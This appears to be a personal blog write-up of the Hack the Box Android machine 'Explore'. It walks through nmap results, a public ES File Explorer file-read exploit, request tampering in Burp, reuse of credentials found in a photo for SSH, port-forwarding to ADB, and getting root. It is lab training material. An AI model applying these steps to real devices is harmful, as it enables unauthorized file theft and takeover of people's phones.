+++
author = "Nick"
categories = ["hack the box", "Android", "ADB", "ES File Explorer", "port forwarding", "burpsuite"]
date = 2021-10-30T18:59:07Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2021/08/explore.png"
slug = "hack-the-box-explore"
tags = ["hack the box", "Android", "ADB", "ES File Explorer", "port forwarding", "burpsuite"]
title = "Hack the Box - Explore"

+++


Welcome back! Today we are doing the Hack the Box machine - Explore. This is listed as an easy Android machine! This is the first time I'll be doing a live Android system vs the classic 'static APK CTF' scenario. Let's jump in!

As usual, we start with a full `nmap` scan, here are the results.

```
Not shown: 65530 closed ports
PORT      STATE    SERVICE VERSION
2222/tcp  open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp  filtered freeciv
33657/tcp open     unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 17 Aug 2021 13:26:41 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Tue, 17 Aug 2021 13:26:41 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Tue, 17 Aug 2021 13:26:46 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 17 Aug 2021 13:27:01 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 17 Aug 2021 13:26:46 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 17 Aug 2021 13:27:01 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 17 Aug 2021 13:27:01 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Tue, 17 Aug 2021 13:27:01 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open     http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=8/17%Time=611BB914%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33657-TCP:V=7.91%I=7%D=8/17%Time=611BB913%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x20
SF:17\x20Aug\x202021\x2013:26:41\x20GMT\r\nContent-Length:\x2022\r\nConten
SF:t-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\
SF:r\nInvalid\x20request\x20line:\x20")%r(GetRequest,5C,"HTTP/1\.1\x20412\
SF:x20Precondition\x20Failed\r\nDate:\x20Tue,\x2017\x20Aug\x202021\x2013:2
SF:6:41\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,B5,"HTTP/1\
SF:.0\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2017\x20Aug\x202021\x
SF:2013:26:46\x20GMT\r\nContent-Length:\x2029\r\nContent-Type:\x20text/pla
SF:in;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nMethod\x20not\x2
SF:0supported:\x20OPTIONS")%r(RTSPRequest,BB,"HTTP/1\.0\x20400\x20Bad\x20R
SF:equest\r\nDate:\x20Tue,\x2017\x20Aug\x202021\x2013:26:46\x20GMT\r\nCont
SF:ent-Length:\x2039\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r
SF:\nConnection:\x20Close\r\n\r\nNot\x20a\x20valid\x20protocol\x20version:
SF:\x20\x20RTSP/1\.0")%r(Help,AE,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDa
SF:te:\x20Tue,\x2017\x20Aug\x202021\x2013:27:01\x20GMT\r\nContent-Length:\
SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection
SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP")%r(SSLSessionReq
SF:,DD,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2017\x20Aug\x
SF:202021\x2013:27:01\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20
SF:text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r\nInvalid\
SF:x20request\x20line:\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\?\?\?,\?\?\?`~\?
SF:\0\?\?{\?\?\?\?w\?\?\?\?<=\?o\?\x10n\0\0\(\0\x16\0\x13\0")%r(TerminalSe
SF:rverCookie,CA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x201
SF:7\x20Aug\x202021\x2013:27:01\x20GMT\r\nContent-Length:\x2054\r\nContent
SF:-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection:\x20Close\r\n\r
SF:\nInvalid\x20request\x20line:\x20\x03\0\0\*%\?\0\0\0\0\0Cookie:\x20msts
SF:hash=nmap")%r(TLSSessionReq,DB,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nD
SF:ate:\x20Tue,\x2017\x20Aug\x202021\x2013:27:01\x20GMT\r\nContent-Length:
SF:\x2071\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnectio
SF:n:\x20Close\r\n\r\nInvalid\x20request\x20line:\x20\x16\x03\0\0i\x01\0\0
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone
```

Quite a listing. We have the port `2222`, `5555`, `33657`, `42135` and `59777`. We see a few different services here. The one that immediatly sticks out to me is the `es file explorer`. There was a file read vulnerability in the application not too long ago. A quick Google search [finds that](https://www.exploit-db.com/exploits/50070) for us.

We copy the PoC to our working directory.

Command:
`cp $(locate 50070.py) .`

Then we supply it's required criteria and point it at the target.

Command:
`python3 getDeviceInfo 10.10.10.247`

Sure enough we get a listing back!

{{< figure src="__GHOST_URL__/content/images/2021/08/image-15.png" >}}

So we know that our 'landing' is on `/sdcard`. Now, we can go through these files and see what we can download and view. Eventually we find a file called `plat_file_contexts`. This file has a much better directory structure for us to view and find a better way in. But we still aren't able to get a full view of the machine / sdcard. So before we write some code for this to function better, some quick seaching [finds another PoC](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln) for this exploit. Let's try this one.

Command:
`git clone https://github.com/fs0c131y/ESFileExplorerOpenPortVuln`

Then install our requirments.

Command:
`pip3 install -r requirements.txt`

Now we we can follow the documenation and point it at the target.

Command:
`python3 poc.py --cmd listFiles --ip 10.10.10.247`

{{< figure src="__GHOST_URL__/content/images/2021/08/image-16.png" >}}

We still get the same output. Based on the research we did, we know this vulnerability is simply making http requests to the server. So when we want to modify those requests, we use `Burpsuite`! First we need to ensure that `import os` is added to our `PoC.py` script, otherwise what we're going to do won't work.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-17.png" >}}

Next, we're going to set some basic `environmental variables` for our proxy.

Command:
`export http_proxy=http://127.0.0.1:8080/`
`export https_proxy=https://127.0.0.1:8080/`

The reason we import the `os` library is because we want this python script to route through using whatever OS specific settings we have setup, in this case, a proxy. With those in place, we can now launch `Burpsuite` and send the exploit code again.explore

{{< figure src="__GHOST_URL__/content/images/2021/08/explore.gif" >}}

This time, we see the request come through our interceptor! We'll send the request to `repeater` and look to modify it. We know we want to enumerate the `/sdcard` location. So the easiest way to attempt to do that is append that location to our `POST` request.

{{< figure src="__GHOST_URL__/content/images/2021/08/userpost.gif" >}}

Awesome, we now have a method for reliably enumerating the system. We'll modify the `POST` request again, this time to download our file.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-18.png" >}}

We changed our `POST` location to be `/sdcard/user.txt` and the method to `getFile`. We send it off and get the `user.txt` flag! Now, we need a method to gain persistance on the machine. We'll use the method we created above to enumerate the system for some kind of `SSH` key / password.

We start by looking in the folders on `/sdcard`. In the `DCIM` location, we have a file called `creds.jpg`. We could download it via `Burp` but in this case, it's a bit easier to just browse to the location - http://10.10.10.247:59777/sdcard/DCIM/creds.jpg

{{< figure src="__GHOST_URL__/content/images/2021/08/image-19.png" >}}

Now we have some creds, let's see if they work for `SSH` as `Kristi`. Sure enough, they do!

{{< figure src="__GHOST_URL__/content/images/2021/08/image-20.png" >}}

Now we need to explore this OS to understand where our root flag is as well as how we plan to get there. We know based on information above that port `5555` hasn't been used yet and is filtered out. If you've done much hacking around on Android devices, you know that this port is generally used for `ADB` - [Android Debug Bridge](https://developer.android.com/studio/command-line/adb). First, let's install `ADB`.

Command:
`sudo apt install android-tools-adb`

Once we have these installed, we can try to connect to the target machine.

Command:
`adb shell 10.10.10.247`

{{< figure src="__GHOST_URL__/content/images/2021/08/image-21.png" >}}

No dice. So we'll need a way to connect to that port. The easiest way to make a remote port, think it's a local port is to leverage `port forwarding`.

Command:
`sudo ssh -p 2222 -L 5555:localhost:5555 kristi@10.10.10.247`

{{< figure src="__GHOST_URL__/content/images/2021/08/image-22.png" >}}

Once we authenticate, we get a shell, as usual. Now we will try to connect to the `ADB` port on our local machine.

Command:
`adb connect localhost:5555`
`adb shell`

{{< figure src="__GHOST_URL__/content/images/2021/08/image-23.png" >}}

Awesome, we now have a shell. If you know anything else about Android, you know that this shell can simply be bumped to root by using `su`.

{{< figure src="__GHOST_URL__/content/images/2021/08/image-24.png" >}}

Now we are root, let's go find that flag! Shortly, after some digging, we find it in `/data/`!

{{< figure src="__GHOST_URL__/content/images/2021/08/image-25.png" >}}

This was a fun new box! If you found this write-up handy, let me know!



